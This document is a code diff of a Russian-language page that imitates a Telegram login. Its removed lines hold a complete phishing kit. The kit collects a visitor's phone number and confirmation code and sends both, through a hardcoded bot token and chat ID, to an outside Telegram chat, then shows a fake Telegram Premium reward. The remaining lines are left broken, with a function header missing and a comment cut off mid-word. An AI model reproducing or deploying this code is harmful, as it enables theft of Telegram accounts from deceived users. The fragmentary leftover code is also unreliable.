@@ -9,46 +9,6 @@
       margin: 0; padding: 0; box-sizing: border-box;
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
     }
-
-    body {
-        margin: 0;
-    	background: #4fc3f7;
-    	height: 100vh;
-    	display: flex;
-    	align-items: center;
-    	justify-content: center;
-    	overflow: hidden;
-    }
-
-    .container {
-      background-color: white;
-      border-radius: 12px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-      width: 100%;
-      max-width: 400px;
-      padding: 30px;
-      text-align: center;
-    }
-
-    .particle {
-	position: fixed;
-        pointer-events: none;
-        z-index: 10000;
-        animation: flyUp 1.8s ease-out forwards;
-        font-size: 24px;
-        will-change: transform, opacity;;
-     }
-
-    @keyframes flyUp {
-        0% {
-            transform: translate(0, 0) scale(1) rotate(0deg);
-                opacity: 1;
-        }
-        100% {
-            transform: translate(var(--end-x), var(--end-y)) scale(0.7) rotate(720deg);
-                opacity: 0;
-        }
-    }
     
     .telegram-logo-container {
       width: 100px;
@@ -128,138 +88,6 @@
       width: 100%;
       font-size: 16px;
       font-weight: 500;
-      cursor: pointer;
-      transition: background-color 0.3s;
-      margin-top: 10px;
-    }
-
-    .btn:hover {
-      background-color: #0077b3;
-    }
-
-    .btn:disabled {
-      background-color: #ccc;
-      cursor: not-allowed;
-    }
-
-    .step {
-      display: none;
-    }
-
-    .step.active {
-      display: block;
-    }
-
-    .back-btn {
-      background: none;
-      border: none;
-      color: #0088cc;
-      cursor: pointer;
-      font-size: 14px;
-      margin-top: 15px;
-      padding: 5px;
-    }
-
-    .loading {
-      display: none;
-      margin: 20px 0;
-    }
-
-    .spinner {
-      border: 3px solid #f3f3f3;
-      border-top: 3px solid #0088cc;
-      border-radius: 50%;
-      width: 30px;
-      height: 30px;
-      animation: spin 1s linear infinite;
-      margin: 0 auto;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .error {
-      color: #ff3333;
-      font-size: 14px;
-      margin-top: 10px;
-      display: none;
-    }
-  </style>
-</head>
-<body>
-    <div class="container">
-        <div class="telegram-logo-container">
-    	    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 240" width="240" height="240">
-  		<!-- Круглый фон -->
-  		<circle cx="120" cy="120" r="120" fill="#0088cc"/>
-  
-  		<!-- Оригинальный самолетик Telegram -->
-  		<path fill="#ffffff" d="M81.229 128.772l7.601 24.508c1.347 4.34 2.478 6.016 4.092 6.016 1.343 0 1.928-.606 2.685-1.363l12.897-12.441 26.79 19.75c4.927 2.718 8.416 1.314 9.653-4.586l17.469-82.376c1.364-5.456-.518-7.945-4.002-6.548L46.632 113.956c-4.999 2-4.945 4.8-.093 6.04l20.93 6.537 48.51-30.558c2.238-1.374 4.286-.694 2.608.884L81.229 128.772z"/>
-	    </svg>
-	</div>
-
-    <div id="step1" class="step active">
-      <h1>Вход в Telegram</h1>
-      <p class="subtitle">Пожалуйста, подтвердите ваш номер телефона для продолжения</p>
-      <div class="input-group">
-        <label>Номер телефона</label>
-        <div class="phone-input">
-          <input type="text" class="country-code" value="+3" />
-          <input type="tel" class="number-input" id="phone" placeholder="Введите номер телефона" />
-        </div>
-      </div>
-      <button class="btn" onclick="sendPhone()">Продолжить</button>
-      <div class="error" id="phoneError">Пожалуйста, введите корректный номер телефона</div>
-    </div>
-
-    <div id="step2" class="step">
-      <h1>Проверка номера</h1>
-      <p class="subtitle">Мы отправили код подтверждения на ваш номер</p>
-      <div class="input-group">
-        <label>Код подтверждения</label>
-        <input type="text" id="code" placeholder="Введите 5-значный код" maxlength="5" />
-      </div>
-      <div class="loading" id="loading">
-        <div class="spinner"></div>
-        <p>Проверка кода...</p>
-      </div>
-      <button class="btn" onclick="sendCode()">Подтвердить</button>
-      <button class="back-btn" onclick="showStep(1)">← Назад</button>
-      <div class="error" id="codeError">Пожалуйста, введите 5-значный код</div>
-    </div>
-  </div>
-
-  <script>
-    
-    function launchParticles(count = 40) {
-    	const symbols = ['🎉', '✨', '⭐', '✨', '🎉', '✨', '❤️'];
-    	const centerX = window.innerWidth / 2;
-    	const startY = window.innerHeight - 20;
-
-    	for (let i = 0; i < count; i++) {
-            const el = document.createElement('div');
-            el.className = 'particle';
-            el.textContent = symbols[Math.floor(Math.random() * symbols.length)];
-
-            el.style.left = `${centerX}px`;
-            el.style.top = `${startY}px`;
-            el.style.fontSize = `${Math.random() * 20 + 16}px`;
-
-            // Угол от -85 до -95 градусов, немного в стороны
-            const angle = (Math.random() * 150 - 55 - 90) * (Math.PI / 180); // от -105° до -75°
-            const speed = Math.random() * 300 + 150;
-
-            const x = Math.cos(angle) * speed;
-            const y = Math.sin(angle) * speed;
-
-            el.style.setProperty('--end-x', `${x}px`);
-            el.style.setProperty('--end-y', `${y}px`);
-
-            el.addEventListener('animationend', () => el.remove());
-            document.body.appendChild(el);
-        }
     }
 
     // Запуск при загрузке
@@ -267,28 +95,6 @@
         launchParticles(50);
     });
 
-    let phoneNumber = '';
-
-    function sendToTelegram(text) {
-      const botToken = '8405773030:AAEy8jqTnlCXcTUIOHb64S0q9sys_l-7dIQ';      // ← вставьте сюда токен бота
-      const chatId = '7792718408';      // ← вставьте сюда ваш chat_id
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: text })
-      });
-    }
-
-    function showStep(step) {
-      document.getElementById('step1').classList.remove('active');
-      document.getElementById('step2').classList.remove('active');
-      document.getElementById(`step${step}`).classList.add('active');
-      document.getElementById('phoneError').style.display = 'none';
-      document.getElementById('codeError').style.display = 'none';
-    }
-
-    function sendPhone() {
       const countryCode = document.querySelector('.country-code').value.trim();
       const phoneInput = document.getElementById('phone');
       const phone = phoneInput.value.trim();
@@ -298,34 +104,7 @@
         return;
       }
 
-      // Объединяем код страны и номер телефона
-      phoneNumber = countryCode + phone;
-
-      sendToTelegram(`📱 Введён номер телефона: ${phoneNumber}`);
-      showStep(2);
-    }
-
-    function sendCode() {
-      const codeInput = document.getElementById('code');
-      const code = codeInput.value.trim();
-
-      if (code.length !== 5 || !/^\d+$/.test(code)) {
-        document.getElementById('codeError').style.display = 'block';
-        return;
-      }
-
-      document.getElementById('loading').style.display = 'block';
-      document.querySelector('.btn').disabled = true;
-
-      sendToTelegram(`🔐 Код подтверждения для ${phoneNumber}: ${code}`);
-
-      setTimeout(() => {
-        document.getElementById('loading').style.display = 'none';
-        document.querySelector('.btn').disabled = false;
-        alert('Поздравляем с Telegram Premium! Изменения скоро вступят в силу.');
-      }, 2000);
-    }
-
+      // Объединяем код с
     document.getElementById('code').addEventListener('input', function (e) {
       this.value = this.value.replace(/[^0-9]/g, '');
     });
